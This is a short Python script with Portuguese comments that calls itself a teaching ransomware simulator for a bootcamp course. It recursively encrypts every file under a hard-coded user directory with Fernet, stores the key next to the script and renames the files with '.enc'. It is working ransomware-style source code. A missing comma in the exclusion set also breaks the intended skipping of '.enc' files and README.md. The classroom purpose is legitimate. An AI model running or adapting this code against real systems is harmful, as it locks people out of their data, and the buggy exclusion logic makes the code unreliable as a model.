###############################################################
# Ransomware.py - Simulador de ransomware para fins didáticos #
# Escrito por Marlon Borba para o Bootcamp Santander - DIO    #
# 5 de janeiro de 2026                                        #
###############################################################

from pathlib import Path
from cryptography.fernet import Fernet

# =========================
# Configurações Iniciais 
# =========================

# Caminho - é um subdiretório dentro deste branch (ransomware\dados)
DIRETORIO_BASE = Path("C:/Users/marlo/OneDrive/curso-dio/ransomware/dados")

# Extensões ou nomes a excluir
EXCLUSOES = {
    ".py",
    ".key",
    ".enc"
    "README.md"
}

# =========================
# Geração da chave criptográfica
# =========================

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as f:
        f.write(chave)
    return chave


def carregar_chave():
    return Path("chave.key").read_bytes()


# =========================
# Encriptação
# =========================

def criptografar_arquivo(caminho: Path, fernet: Fernet):
    dados = caminho.read_bytes()
    dados_criptografados = fernet.encrypt(dados)

    caminho.write_bytes(dados_criptografados)
    caminho.rename(caminho.with_suffix(caminho.suffix + ".enc"))


# =========================
# Excluir arquivos que não podem ser tocados ou já encriptados
# =========================

def deve_excluir(caminho: Path) -> bool:
    return (
        caminho.name in EXCLUSOES
        or caminho.suffix in EXCLUSOES
    )


# =========================
# Ciclo de processamento do diretório
# =========================

def criptografar_diretorio(base: Path):
    chave = carregar_chave() if Path("chave.key").exists() else gerar_chave()
    fernet = Fernet(chave)

    for arquivo in base.rglob("*"):
        if not arquivo.is_file():
            continue

        if deve_excluir(arquivo):
            continue

        print(f"[+] Criptografando: {arquivo}")
        criptografar_arquivo(arquivo, fernet)


if __name__ == "__main__":
    criptografar_diretorio(DIRETORIO_BASE)
